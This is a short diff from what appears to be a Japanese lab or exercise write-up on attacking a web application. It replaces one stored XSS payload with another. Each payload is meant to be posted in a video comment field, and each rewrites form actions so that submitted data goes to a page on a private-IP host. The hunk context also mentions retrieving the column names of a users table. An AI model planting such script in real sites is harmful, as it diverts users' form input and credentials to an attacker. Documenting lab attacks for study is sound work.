@@ -94,7 +94,7 @@ usersテーブルのカラム名を取得：
 動画のコメント欄に以下のJavaScriptコードを投稿：
 
 ```javascript
-<script>document.onkeypress = function(e) {var f=document.forms;var i=f.length-1;do{f[i].action="http://192.168.25.128/project/projitu_1/static/you.html";f[i].onsubmit=null;}while(--i);}</script>
+<script> window.onload = function(){ document.querySelector(".comment-form form").onsubmit = function(){this.action = "http://192.168.25.128/project/projitu_1/static/you.html"; };};</script>
 ```
 
 ### 2.3 攻撃の実行
